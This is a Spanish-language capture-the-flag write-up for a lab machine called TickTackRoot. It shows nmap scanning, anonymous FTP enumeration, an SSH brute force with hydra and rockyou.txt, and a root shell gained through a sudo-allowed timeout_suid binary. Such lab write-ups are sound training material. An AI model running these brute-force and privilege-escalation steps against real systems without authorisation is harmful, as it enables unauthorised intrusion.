# TickTackRoot - Writeup (CTF)

**Dificultad:** Fácil / Media  
**IP de la Máquina:** `192.168.0.10`  
**Objetivo:** Obtener acceso al sistema y escalar privilegios hasta el usuario `root`.

---

## 📝 Descripción General

El compromiso de la máquina **TickTackRoot** se divide en tres fases principales:
1. **Enumeración:** Acceso anónimo vía FTP que revela un directorio llamado `login` relacionado con el usuario `robin`.
2. **Intrusión:** Ataque de fuerza bruta por SSH contra el usuario identificado para consolidar el acceso inicial.
3. **Escalada de Privilegios:** Explotación de un binario SUID/Sudo custom (`timeout_suid`) ejecutado de forma prolongada para obtener una *shell* de root.

---

## 🔍 1. Enumeración y Reconocimiento

### Escaneo de Puertos (Nmap)
Se realiza un escaneo inicial para descubrir los puertos TCP abiertos en el objetivo:

```bash
nmap -Pn -p- --min-rate 5000 192.168.0.10
```

**Resultado del escaneo:**
* **21/tcp:** FTP (vsFTPd 3.0.5)
* **22/tcp:** SSH (OpenSSH 9.6p1)
* **80/tcp:** HTTP (Apache httpd 2.4.58)

### Análisis de Servicios
Se ejecuta un escaneo detallado de versiones y scripts por defecto en los puertos encontrados:

```bash
nmap -sCV -p 21,22,80 192.168.0.10
```

El reporte revela que el **acceso anónimo está permitido en el servicio FTP**:
```text
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           10671 Oct 03  2024 index.html
|_drwxr-xr-x    2 0        0            4096 Oct 07  2024 login
```

---

## ⚡ 2. Acceso Inicial (Explotación)

### Inspección de FTP
Nos conectamos de forma anónima al servidor FTP para descargar los archivos disponibles:

```bash
ftp -a 192.168.0.10
```
Dentro del servidor, la presencia del directorio `login` y la estructura web sugieren referencias directas al usuario potencial del sistema: **robin**.

### Fuerza Bruta SSH
Utilizando el nombre de usuario identificado (`robin`), lanzamos un ataque de fuerza bruta contra el servicio SSH con el diccionario `rockyou.txt`:

```bash
hydra -l robin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10 -t 64
```

Tras obtener las credenciales válidas, estabilizamos la conexión ingresando al servidor:

```bash
ssh robin@192.168.0.10
```

---

## 🚀 3. Escalada de Privilegios

### Enumeración Local
Una vez dentro del sistema como el usuario `robin`, revisamos los privilegios de *Sudo* asignados al usuario actual:

```bash
robin@TheHackersLabs-Ticktackroot:~$ sudo -l
```

**Resultado:**
```text
User robin may run the following commands on TheHackersLabs-Ticktackroot:
    (ALL) NOPASSWD: /usr/bin/timeout_suid
```

El usuario puede ejecutar `/usr/bin/timeout_suid` como cualquier usuario (incluido `root`) sin necesidad de proporcionar contraseña.

### Explotación de timeout_suid
El binario funciona de manera similar al comando estándar `timeout`, el cual ejecuta un comando y lo finaliza si supera la duración especificada. Al indicarle un tiempo prolongado (por ejemplo, **7 días** o `7d`), la sesión de la *shell* invocada se mantendrá activa bajo el contexto de privilegios elevados de *root*:

```bash
sudo /usr/bin/timeout_suid 7d /bin/bash
```

### Post-Explotación
Validamos la identidad del nuevo entorno y listamos la flag de usuario:

```bash
root@TheHackersLabs-Ticktackroot:/home/robin# whoami
root

root@TheHackersLabs-Ticktackroot:/home/robin# ls
user.txt
```

¡Máquina comprometida exitosamente!
